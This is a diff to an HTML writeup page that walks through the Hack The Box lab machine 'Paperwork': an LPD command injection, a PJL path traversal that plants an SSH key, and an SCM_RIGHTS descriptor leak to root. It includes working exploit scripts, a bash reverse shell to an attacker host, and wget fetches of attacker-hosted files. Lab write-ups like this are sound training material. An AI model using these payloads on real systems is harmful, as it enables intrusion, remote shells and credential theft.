@@ -3,7 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Paperwork HTB Machine — .d4nx0</title>
+  <title>Paperwork — .d4nx0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
   <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
   <link rel="stylesheet" href="../css/style.css" />
@@ -30,35 +32,224 @@
     <div class="main">
       <div class="content">
         <a href="index.html" class="back-link"><i class="bx bx-left-arrow-alt"></i> Back to writeups</a>
-        <header class="detail-header">
-          <div class="meta">2026-03-30</div>
-          <h1>Paperwork HTB Machine</h1>
-          <div class="tags" style="margin-bottom:0.75rem">
-            <span class="tag">LINUX</span>
-            <span class="tag amber">EASY</span>
-            <span class="tag muted">HTB</span> <span class="tag muted">LPD</span> <span class="tag muted">SCM_RIGHTS</span> 
-          </div>
-          <p class="meta">RCE via LPD command injection, path traversal to SSH key injection, and SCM_RIGHTS FD leak to root.</p>
-        </header>
-        <div class="detail-body">
-          <h2>Notes</h2>
-          <p>
-            Entry migrated from the Cyber Notes collection. Expand with full enumeration steps,
-            exploit chain, and privilege-escalation details as you refine the writeup.
-          </p>
-          <div class="cmd-block" style="margin-top:1.25rem">
-            <div class="cmd-block-label">summary</div>
-            <div class="cmd-block-body">
-              <span class="prompt">$</span>
-              <code>cat writeups/htb-paperwork.md</code>
-            </div>
+
+        <div class="note-header">
+          <h1>Paperwork</h1>
+          <div class="note-meta">
+            <div class="row"> HTB Season <span class="highlight">11</span> Week <span class="highlight">#8</span></div>
+            <div class="row"> Machine <span class="highlight">Paperwork</span></div>
+            <div class="row"> OS <span class="highlight">Linux</span></div>
+            <div class="row"> Difficulty <span class="highlight">Easy</span></div>
+            <div class="row"> Vulnerabilities [<span class="highlight">Cmd Injection</span>] [<span class="highlight">Path Traversal</span>] [<span class="highlight">SCM_RIGHTS</span>] [<span class="highlight">FD Leak</span>]</div>
           </div>
         </div>
+
+        <div class="note-content">
+          <h2>1. Reconnaissance</h2>
+          <h3>Ports Scan</h3>
+          <pre><code>rustscan -a &lt;target-ip&gt; -- -sC -sV -oA nmap-result</code></pre>
+          <p><strong>Open Ports:</strong></p>
+          <ul>
+            <li><strong>22/tcp</strong> – SSH (OpenSSH 10.0p2)</li>
+            <li><strong>80/tcp</strong> – HTTP (nginx 1.28.0)</li>
+            <li><strong>1515/tcp</strong> – <em>ifor-protocol?</em> (Archive_Printer ready)</li>
+          </ul>
+          <div class="callout info">
+            <strong>💡 Info</strong>
+            Make sure to register the hostname and adjust your MTU to avoid connection issues:
+            <pre><code>echo '&lt;target-ip&gt; paperwork.htb' | sudo tee -a /etc/hosts
+sudo ip link set dev tun0 mtu 1300</code></pre>
+          </div>
+          <h3>Enumeration</h3>
+          <p>Reviewing the web page at <code>http://paperwork.htb</code> revealed a downloadable archive file: <code>archive.zip</code>.</p>
+          <pre><code>wget http://paperwork.htb/download/archive
+unzip archive
+# server.py</code></pre>
+          <p>Analyzing <code>server.py</code>, the daemon listens on port <strong>1515 (LPD)</strong> and processes print jobs. When a job is received, it extracts the <strong>job name</strong> from the control file and logs it using <code>subprocess.Popen</code> with <code>shell=True</code>.</p>
+          <pre><code>subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)</code></pre>
+          <div class="callout info">
+            <strong>🚨 Vulnerability</strong>
+            Because <code>shell=True</code> is used, the command string is passed to <code>/bin/sh</code>. The critical step is crafting the <strong>Control File</strong> (sent after the <code>0x02</code> opcode for receiving a control file).
+          </div>
+
+          <h2>2. Exploitation</h2>
+          <h3>Crafting the Payload (<code>exploit.py</code>)</h3>
+          <pre><code>import socket
+
+TARGET = "paperwork.htb"
+PORT   = 1515
+QUEUE  = "archive_intake" # confirmed from the web page
+
+LHOST = "&lt;attacker-ip&gt;"
+LPORT = 4444
+payload = f"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1'"
+job_name = f"x'; {payload} ; echo '"
+control_file = f"H kali\nP root\nJ {job_name}\n"
+cf_bytes = control_file.encode()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TARGET, PORT))
+
+s.send(b'\x02' + QUEUE.encode() + b'\n')
+print("recvjob ack:", s.recv(1024))
+
+cfname = "cfA001kali"
+header = b'\x02' + f"{len(cf_bytes)} {cfname}\n".encode()
+s.send(header)
+print("header ack:", s.recv(1024))
+
+s.send(cf_bytes)
+s.send(b'\x00')
+print("final:", s.recv(1024))
+s.close()</code></pre>
+          <h3>Running the Exploit</h3>
+          <p>Start a listener on your attacker machine:</p>
+          <pre><code>nc -lnvp 4444</code></pre>
+          <p>Execute the script:</p>
+          <pre><code>python3 exploit.py</code></pre>
+          <p>Gain access as the <code>lp</code> user:</p>
+          <pre><code>lp@paperwork:/opt/LPDServer$ id
+uid=7(lp) gid=7(lp) groups=7(lp)</code></pre>
+
+          <h2>3. Post-exploitation</h2>
+          <h3>Lateral Movement (<code>lp</code> → <code>archivist</code>)</h3>
+          <p>The <code>lp</code> user has access to the internal network where a <strong>JetDirect/PJL service</strong> runs on port <strong>9100</strong> (bound to <code>127.0.0.1</code>). This service, running as <code>archivist</code>, contains a <strong>path traversal vulnerability</strong> in its file system implementation.</p>
+          <pre><code>ps -ef | grep jetdirect
+# archivi+  987  1  0 05:45 ?  00:00:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 ...</code></pre>
+          <div class="callout warning">
+            <strong>⚠️ Vulnerability</strong>
+            The <code>jetdirect.py</code> daemon normalizes paths but fails to strip <code>..</code> sequences before joining them to the root directory. You can abuse the <code>@PJL FSDOWNLOAD</code> command to write files.
+          </div>
+          <p><strong>On attacker machine:</strong></p>
+          <p>Generate an SSH key for the <code>archivist</code> user:</p>
+          <pre><code>ssh-keygen -t rsa -f id_rsa_archivist</code></pre>
+          <p>Create the upload script <code>putsshkey.py</code>:</p>
+          <pre><code>import socket
+
+HOST = '127.0.0.1'
+PORT = 9100
+TARGET_PATH = "0:../../../home/archivist/.ssh/authorized_keys"
+
+with open('id_rsa_archivist.pub', 'rb') as f:
+    pub_key = f.read()
+
+payload = f"@PJL FSDOWNLOAD NAME=\"{TARGET_PATH}\" SIZE={len(pub_key)}\r\n".encode()
+payload += pub_key
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.sendall(payload)
+s.close()
+print("[+] SSH Key injected!")</code></pre>
+          <p>Start a local HTTP server:</p>
+          <pre><code>python3 -m http.server</code></pre>
+          <p><strong>On target machine (as <code>lp</code>):</strong></p>
+          <pre><code>cd /tmp
+wget http://&lt;attacker-ip&gt;:8000/id_rsa_archivist.pub
+wget http://&lt;attacker-ip&gt;:8000/putsshkey.py
+python3 putsshkey.py
+# [+] SSH Key injected!</code></pre>
+          <p><strong>Back on attacker machine:</strong></p>
+          <pre><code>ssh -i id_rsa_archivist archivist@paperwork.htb
+
+# Welcome to Ubuntu 25.10...
+archivist@paperwork:~$ id
+uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)</code></pre>
+
+          <h3>Privilege Escalation (<code>archivist</code> → <code>root</code>)</h3>
+          <p>Once as <code>archivist</code>, you will find a root-owned daemon (<code>paperwork-daemon</code>) listening on a Unix socket at <code>/run/paperwork/mgmt.sock</code>. This daemon is vulnerable to an <strong>SCM_RIGHTS file descriptor leak</strong>.</p>
+          <pre><code>ps -ef | grep paperwork-daemon
+# root 1492  1  0 05:45 ?  00:00:00 /usr/bin/python3 /usr/bin/paperwork-daemon</code></pre>
+          <div class="callout warning">
+            <strong>⚠️ Vulnerability</strong>
+            The daemon opens <code>/etc/paperwork/admin_pins.conf</code> (readable only by root) at startup. When it detects specific strings (like <code>FSUPLOAD</code>) in the writable log file <code>/home/archivist/printer/logs/commands.log</code>, it sends the file descriptor for the admin config file to the connected client via <code>SCM_RIGHTS</code>.
+          </div>
+          <p><strong>On target machine (as <code>archivist</code>):</strong></p>
+          <p>Trigger the condition by appending the string to the log file:</p>
+          <pre><code>echo "FSUPLOAD" >> /home/archivist/printer/logs/commands.log</code></pre>
+          <p>Create the <code>leakfd.py</code> script directly on the target machine:</p>
+          <pre><code>import socket
+import array
+import os
+
+SOCK_PATH = "/run/paperwork/mgmt.sock"
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect(SOCK_PATH)
+
+data, ancillary, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(4096))
+
+for cmsg_level, cmsg_type, cmsg_data in ancillary:
+    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
+        fds = array.array("i", cmsg_data)
+        for fd in fds:
+            try:
+                content = os.pread(fd, 1024, 0)
+                print(f"[+] Leaked FD {fd} content: {content.decode()}")
+            except OSError:
+                pass
+s.close()</code></pre>
+          <p>Execute the script to leak the password:</p>
+          <pre><code>python3 leakfd.py
+# [+] Leaked FD 5 content: ADMIN_PASSWORD=&lt;password&gt;</code></pre>
+          <p>Switch to <code>root</code>:</p>
+          <pre><code>su root
+# Enter the leaked password
+
+root@paperwork:~# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+          <h2>4. Flag Paths</h2>
+          <ul>
+            <li><strong>User flag:</strong> <code>/home/archivist/user.txt</code></li>
+            <li><strong>Root flag:</strong> <code>/root/root.txt</code></li>
+          </ul>
+          <div class="callout info">
+            <strong>✅ Lessons Learned</strong>
+            This machine requires chaining multiple vulnerabilities: RCE via unsanitized <code>shell=True</code>, path traversal to write an SSH key, and <code>SCM_RIGHTS</code> file descriptor leaking to read a root-owned config file. Always check internal services and Unix sockets!
+          </div>
+        </div>
+
       </div>
       <footer class="page-footer">// NOTES ARE STATIC, VERSIONED IN GIT — EDIT HTML AND PUSH</footer>
     </div>
   </div>
-  <button type="button" class="mobile-toggle" id="mobileToggle"><i class="bx bx-menu"></i></button>
+  <button type="button" class="mobile-toggle" id="mobileToggle" aria-label="Menu"><i class="bx bx-menu"></i></button>
   <script src="../js/app.js"></script>
+  <script>
+    // Syntax highlight commands + comments in code blocks
+    document.querySelectorAll('.note-content pre code').forEach(block => {
+      let html = block.innerHTML;
+      html = html.replace(/^(# .*)/gm, '<span class="comment">$1</span>');
+      const commands = ['wget','unzip','python3','sudo','nmap','ssh','ssh-keygen','rustscan','gobuster','ffuf','curl','nc','echo','cat','cd','mkdir','cp','mv','rm','chmod','chown','find','grep','awk','sed','tar','scp','systemctl','su','exit','whoami','id','ls','ping','traceroute','dig','host','ps','kill','pwd','touch','ln','read','exec','bash','sh','zsh','set','export','alias','clear','git','pip','dpkg','ip'];
+      const regex = new RegExp('\\b(' + commands.join('|') + ')\\b(?= |$)', 'gm');
+      html = html.replace(regex, '<span class="cmd">$1</span>');
+      block.innerHTML = html;
+    });
+    // Copy buttons on pre blocks
+    document.querySelectorAll('.note-content pre').forEach(pre => {
+      if (pre.querySelector('.copy-btn')) return;
+      const btn = document.createElement('button');
+      btn.className = 'copy-btn';
+      btn.type = 'button';
+      btn.innerText = 'Copy';
+      btn.addEventListener('click', () => {
+        const code = pre.querySelector('code');
+        const text = code ? code.innerText : pre.innerText;
+        navigator.clipboard.writeText(text).then(() => {
+          btn.innerText = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(() => { btn.innerText = 'Copy'; btn.classList.remove('copied'); }, 2000);
+        });
+      });
+      pre.appendChild(btn);
+    });
+    function toggleZoom(img) {
+      img.classList.toggle('expanded');
+      if (img.classList.contains('expanded')) {
+        setTimeout(() => img.scrollIntoView({ behavior: 'smooth', block: 'center' }), 100);
+      }
+    }
+  </script>
 </body>
 </html>
